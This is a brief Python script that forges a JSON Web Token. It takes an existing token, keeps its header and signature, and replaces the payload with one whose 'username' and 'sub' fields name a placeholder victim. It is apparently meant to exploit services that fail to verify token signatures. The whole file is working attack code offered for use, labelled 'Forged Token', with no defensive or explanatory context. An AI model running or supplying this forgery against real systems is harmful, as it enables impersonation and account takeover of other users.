import base64
import json

def encode(data):
    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

def forge_token(original_token, new_payload):
    header, payload, signature = original_token.split(".")

    forged_payload = encode(new_payload)

    return f"{header}.{forged_payload}.{signature}"


# Example usage
original = "PUT_ORIGINAL_TOKEN_HERE"

new_payload = {
    "username": "VICTIM_ID",
    "sub": "VICTIM_ID"
}

forged = forge_token(original, new_payload)

print("Forged Token:\n", forged)
